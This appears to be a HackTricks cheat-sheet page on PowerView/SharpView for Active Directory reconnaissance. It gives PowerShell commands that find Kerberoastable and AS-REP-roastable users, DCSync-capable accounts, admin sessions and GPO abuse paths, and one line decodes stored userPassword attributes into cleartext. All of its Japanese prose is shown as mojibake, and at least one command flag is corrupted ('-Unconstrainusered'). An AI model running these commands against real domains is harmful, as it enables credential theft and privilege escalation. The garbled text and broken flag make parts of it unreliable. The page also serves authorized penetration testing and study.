# PowerView/SharpView

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ã‚ãªãŸã¯**ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ HackTricksã§ã‚ãªãŸã®**ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[hacktricks repo](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

PowerViewã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¯å¸¸ã«PowerSploitã®devãƒ–ãƒ©ãƒ³ãƒã«ã‚ã‚Šã¾ã™ï¼š[https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

[**SharpView**](https://github.com/tevora-threat/SharpView)ã¯[**PowerView**](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)ã®.NETãƒãƒ¼ãƒˆã§ã™ã€‚

### ã‚¯ã‚¤ãƒƒã‚¯åˆ—æŒ™
```powershell
Get-NetDomain #Basic domain info
#User info
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount #Basic user enabled info
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN #Kerberoastable users
#Groups info
Get-NetGroup | select samaccountname, admincount, description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders
#Computers
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrainusered | select samaccountname #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
#Shares
Find-DomainShare -CheckShareAccess #Search readable shares
#Domain trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
#LHF
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess
#Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
Invoke-UserHunter -CheckAccess
#Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
```
### ãƒ‰ãƒ¡ã‚¤ãƒ³æƒ…å ±

```powershell
Get-Domain
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ç¾åœ¨ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã«é–¢ã™ã‚‹æƒ…å ±ã‚’å–å¾—ã—ã¾ã™ã€‚ä»¥ä¸‹ã®æƒ…å ±ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

- ãƒ‰ãƒ¡ã‚¤ãƒ³å
- ãƒ‰ãƒ¡ã‚¤ãƒ³SID
- ãƒ•ã‚©ãƒ¬ã‚¹ãƒˆå
- ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ã®ãƒªã‚¹ãƒˆ
- ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒªã‚¹ãƒˆ
- ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒªã‚¹ãƒˆ
- ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒªã‚¹ãƒˆ
- ãƒ‰ãƒ¡ã‚¤ãƒ³ã®GPOï¼ˆã‚°ãƒ«ãƒ¼ãƒ—ãƒãƒªã‚·ãƒ¼ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆï¼‰ã®ãƒªã‚¹ãƒˆ

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã®æƒ…å ±åé›†ã«å½¹ç«‹ã¡ã¾ã™ã€‚
```powershell
# Domain Info
Get-Domain #Get info about the current domain
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID

# Policy
Get-DomainPolicy #Get info about the policy
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."SystemAccess" #Password policy
Get-DomainPolicyData | select -ExpandProperty SystemAccess #Same as previous
(Get-DomainPolicy).PrivilegeRights #Check your privileges
Get-DomainPolicyData # Same as Get-DomainPolicy

# Domain Controller
Get-DomainController | select Forest, Domain, IPAddress, Name, OSVersion | fl # Get specific info of current domain controller
Get-NetDomainController -Domain mydomain.local #Get all ifo of specific domain Domain Controller

# Get Forest info
Get-ForestDomain
```
### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã€ã‚°ãƒ«ãƒ¼ãƒ—ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã€ãŠã‚ˆã³OU

PowerViewã¯ã€Active Directoryï¼ˆADï¼‰ç’°å¢ƒã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã€ã‚°ãƒ«ãƒ¼ãƒ—ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã€ãŠã‚ˆã³çµ„ç¹”å˜ä½ï¼ˆOUï¼‰ã«é–¢ã™ã‚‹æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã®å¼·åŠ›ãªãƒ„ãƒ¼ãƒ«ã§ã™ã€‚

#### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æƒ…å ±ã‚’å–å¾—ã™ã‚‹

PowerViewã‚’ä½¿ç”¨ã—ã¦ã€ADå†…ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«é–¢ã™ã‚‹æƒ…å ±ã‚’å–å¾—ã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Get-NetUser
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®åå‰ã€SIDã€èªè¨¼æƒ…å ±ã€ãŠã‚ˆã³ãã®ä»–ã®é–¢é€£æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

#### ã‚°ãƒ«ãƒ¼ãƒ—ã®æƒ…å ±ã‚’å–å¾—ã™ã‚‹

PowerViewã‚’ä½¿ç”¨ã—ã¦ã€ADå†…ã®ã‚°ãƒ«ãƒ¼ãƒ—ã«é–¢ã™ã‚‹æƒ…å ±ã‚’å–å¾—ã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Get-NetGroup
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ã‚°ãƒ«ãƒ¼ãƒ—ã®åå‰ã€SIDã€ãƒ¡ãƒ³ãƒãƒ¼ã€ãŠã‚ˆã³ãã®ä»–ã®é–¢é€£æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

#### ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã®æƒ…å ±ã‚’å–å¾—ã™ã‚‹

PowerViewã‚’ä½¿ç”¨ã—ã¦ã€ADå†…ã®ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã«é–¢ã™ã‚‹æƒ…å ±ã‚’å–å¾—ã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Get-NetComputer
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã®åå‰ã€SIDã€IPã‚¢ãƒ‰ãƒ¬ã‚¹ã€ãŠã‚ˆã³ãã®ä»–ã®é–¢é€£æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

#### çµ„ç¹”å˜ä½ï¼ˆOUï¼‰ã®æƒ…å ±ã‚’å–å¾—ã™ã‚‹

PowerViewã‚’ä½¿ç”¨ã—ã¦ã€ADå†…ã®çµ„ç¹”å˜ä½ï¼ˆOUï¼‰ã«é–¢ã™ã‚‹æƒ…å ±ã‚’å–å¾—ã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Get-NetOU
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€OUã®åå‰ã€SIDã€è¦ªOUã€ãŠã‚ˆã³ãã®ä»–ã®é–¢é€£æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

ã“ã‚Œã‚‰ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€ADç’°å¢ƒå†…ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã€ã‚°ãƒ«ãƒ¼ãƒ—ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã€ãŠã‚ˆã³OUã«é–¢ã™ã‚‹æƒ…å ±ã‚’ç°¡å˜ã«å–å¾—ã§ãã¾ã™ã€‚
```powershell
# Users
## Get usernames and their groups
Get-DomainUser -Properties name, MemberOf | fl
## Get-DomainUser and Get-NetUser are kind of the same
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select samaccountname, description, pwdlastset, logoncount, badpwdcount #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount  #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter
# Get users with reversible encryption (PWD in clear text with dcsync)
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

# Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto #Constrained Resource Delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation
# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}
# Users with PASSWD_NOTREQD set in the userAccountControl means that the user is not subject to the current password policy
## Users with this flag might have empty passwords (if allowed) or shorter passwords
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

#Groups
Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName
## Get-DomainGroup is similar to Get-NetGroup
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl #Search admin grups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} #Get ObjectACLs by sid
Get-NetGPOGroup #Get restricted groups

# Computers
Get-DomainComputer -Properties DnsHostName # Get all domain maes of computers
## Get-DomainComputer is kind of the same as Get-NetComputer
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups

#OU
Get-DomainOU -Properties Name | sort -Property Name #Get names of OUs
Get-DomainOU "Servers" | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties Name} #Get all computers inside an OU (Servers in this case)
## Get-DomainOU is kind of the same as Get-NetOU
Get-NetOU #Get Organization Units
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} #Get all computers inside an OU (StudentMachines in this case)
```
### ãƒ­ã‚°ã‚ªãƒ³ã¨ã‚»ãƒƒã‚·ãƒ§ãƒ³

PowerViewã¯ã€Windowsç’°å¢ƒã§ãƒ­ã‚°ã‚ªãƒ³æƒ…å ±ã¨ã‚»ãƒƒã‚·ãƒ§ãƒ³æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã®ä¾¿åˆ©ãªãƒ„ãƒ¼ãƒ«ã§ã™ã€‚

#### ãƒ­ã‚°ã‚ªãƒ³æƒ…å ±ã®å–å¾—

PowerViewã‚’ä½¿ç”¨ã—ã¦ã€ãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ­ã‚°ã‚ªãƒ³æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Get-NetLoggedon
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã®ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ­ã‚°ã‚ªãƒ³æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ãƒ­ã‚°ã‚ªãƒ³ã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã€ãƒ‰ãƒ¡ã‚¤ãƒ³åã€ãŠã‚ˆã³ãƒ­ã‚°ã‚ªãƒ³ã—ã¦ã„ã‚‹ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼åãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

#### ã‚»ãƒƒã‚·ãƒ§ãƒ³æƒ…å ±ã®å–å¾—

PowerViewã‚’ä½¿ç”¨ã—ã¦ã€ãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Get-NetSession
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã®ã™ã¹ã¦ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®IDã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼åã€ãŠã‚ˆã³ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®çŠ¶æ…‹ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

ã“ã‚Œã‚‰ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€ãƒ­ã‚°ã‚ªãƒ³ã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚„ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®æƒ…å ±ã‚’ç°¡å˜ã«å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```powershell
Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
Get-NetSession -ComputerName <servername> #Get active sessions on the host
Get-LoggedOnLocal -ComputerName <servername> #Get locally logon users at the moment (need remote registry (default in server OS))
Get-LastLoggedon -ComputerName <servername> #Get last user logged on (needs admin rigths in host)
Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)
```
### ã‚°ãƒ«ãƒ¼ãƒ—ãƒãƒªã‚·ãƒ¼ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ - GPO

æ”»æ’ƒè€…ãŒ**GPOã«å¯¾ã—ã¦é«˜ã„ç‰¹æ¨©ã‚’æŒã£ã¦ã„ã‚‹**å ´åˆã€ãã‚Œã‚’æ‚ªç”¨ã—ã¦**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«æ¨©é™ã‚’è¿½åŠ **ã—ãŸã‚Šã€ãƒ›ã‚¹ãƒˆã«**ãƒ­ãƒ¼ã‚«ãƒ«ç®¡ç†è€…ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è¿½åŠ **ã—ãŸã‚Šã€(å³æ™‚ã®)**ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã‚’ä½œæˆ**ã—ã¦ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚\
[**è©³ç´°æƒ…å ±ã¨ãã®æ‚ªç”¨æ–¹æ³•ã«ã¤ã„ã¦ã¯ã€ã“ã®ãƒªãƒ³ã‚¯ã‚’å‚ç…§ã—ã¦ãã ã•ã„**](../active-directory-methodology/acl-persistence-abuse/#gpo-delegation)ã€‚
```powershell
#GPO
Get-DomainGPO | select displayName #Check the names for info
Get-NetGPO #Get all policies with details
Get-NetGPO | select displayname #Get the names of the policies
Get-NetGPO -ComputerName <servername> #Get the policy applied in a computer
gpresult /V #Get current policy

# Get who can create new GPOs
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=invented,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Enumerate permissions for GPOs where users with RIDs of > 1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Get permissions a user/group has over any GPO
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# COnvert GPO GUID to name
Get-GPO -Guid 18E5A689-E67F-90B2-1953-198ED4A7F532

# Transform SID to name
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126

# Get GPO of an OU
Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'

# Returns all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences.
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GPOType

# Enumerates the machines where a specific domain user/group is a member of a specific local group.
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
```
ACLï¼ˆã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ãƒªã‚¹ãƒˆï¼‰ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆï¼ˆãƒ•ã‚¡ã‚¤ãƒ«ã€ãƒ•ã‚©ãƒ«ãƒ€ã€ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚­ãƒ¼ãªã©ï¼‰ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’åˆ¶å¾¡ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã§ã™ã€‚ACLã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«å¯¾ã—ã¦è¨±å¯ã¾ãŸã¯æ‹’å¦ã®ã‚¨ãƒ³ãƒˆãƒªã‚’æŒã¤ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è­˜åˆ¥å­ï¼ˆSIDï¼‰ã®ãƒªã‚¹ãƒˆã§ã™ã€‚

ACLã®æ§‹é€ ã¯æ¬¡ã®ã‚ˆã†ã«ãªã£ã¦ã„ã¾ã™ï¼š

- ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ç¨®é¡ï¼ˆãƒ•ã‚¡ã‚¤ãƒ«ã€ãƒ•ã‚©ãƒ«ãƒ€ã€ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚­ãƒ¼ãªã©ï¼‰ã«å¿œã˜ã¦ã€ç•°ãªã‚‹ã‚¿ã‚¤ãƒ—ã®ã‚¨ãƒ³ãƒˆãƒªãŒå­˜åœ¨ã—ã¾ã™ã€‚
- ã‚¨ãƒ³ãƒˆãƒªã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è­˜åˆ¥å­ï¼ˆSIDï¼‰ã¨ã‚¢ã‚¯ã‚»ã‚¹è¨±å¯ã®çµ„ã¿åˆã‚ã›ã§æ§‹æˆã•ã‚Œã¾ã™ã€‚
- ã‚¨ãƒ³ãƒˆãƒªã¯ã€ç‰¹å®šã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¾ãŸã¯ã‚°ãƒ«ãƒ¼ãƒ—ã«å¯¾ã—ã¦è¨±å¯ã¾ãŸã¯æ‹’å¦ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’æä¾›ã—ã¾ã™ã€‚

ACLã®æ‚ªç”¨ã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ç‰¹æ¨©ã®æ˜‡æ ¼ã€ãƒ‡ãƒ¼ã‚¿ã®æ¼æ´©ã€ã‚·ã‚¹ãƒ†ãƒ ã®ç ´å£Šãªã©ã®æ‚ªå½±éŸ¿ã‚’ã‚‚ãŸã‚‰ã™ã“ã¨ãŒã§ãã¾ã™ã€‚ACLã®æ‚ªç”¨ã«ã¯ã€æ¬¡ã®ã‚ˆã†ãªæ‰‹æ³•ãŒã‚ã‚Šã¾ã™ï¼š

- ACLã®å¤‰æ›´ï¼šæ”»æ’ƒè€…ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ACLã‚’å¤‰æ›´ã—ã¦ã€è‡ªèº«ã«ç‰¹æ¨©ã‚’ä¸ãˆã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
- ACLã®ãƒã‚¤ãƒ‘ã‚¹ï¼šæ”»æ’ƒè€…ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ACLã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¦ã€ã‚¢ã‚¯ã‚»ã‚¹åˆ¶é™ã‚’å›é¿ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
- ACLã®æ¼æ´©ï¼šæ”»æ’ƒè€…ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ACLã‚’èª¿æŸ»ã—ã¦ã€é‡è¦ãªæƒ…å ±ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ACLã®æ‚ªç”¨ã¯ã€Active Directoryç’°å¢ƒã§ç‰¹ã«é‡è¦ã§ã™ã€‚æ”»æ’ƒè€…ã¯ã€Active Directoryã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã€ã‚°ãƒ«ãƒ¼ãƒ—ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãªã©ï¼‰ã®ACLã‚’æ‚ªç”¨ã—ã¦ã€æ¨©é™ã®æ˜‡æ ¼ã‚„æ¨©é™ã®æ‹¡å¤§ã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚

ACLã®æ‚ªç”¨ã«å¯¾ã™ã‚‹é˜²å¾¡ç­–ã¨ã—ã¦ã¯ã€æ¬¡ã®ã‚ˆã†ãªå¯¾ç­–ãŒã‚ã‚Šã¾ã™ï¼š

- æœ€å°ç‰¹æ¨©ã®åŸå‰‡ã‚’é©ç”¨ã™ã‚‹ï¼šãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚„ã‚°ãƒ«ãƒ¼ãƒ—ã«ã¯ã€å¿…è¦ãªæœ€ä½é™ã®æ¨©é™ã®ã¿ã‚’ä¸ãˆã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚
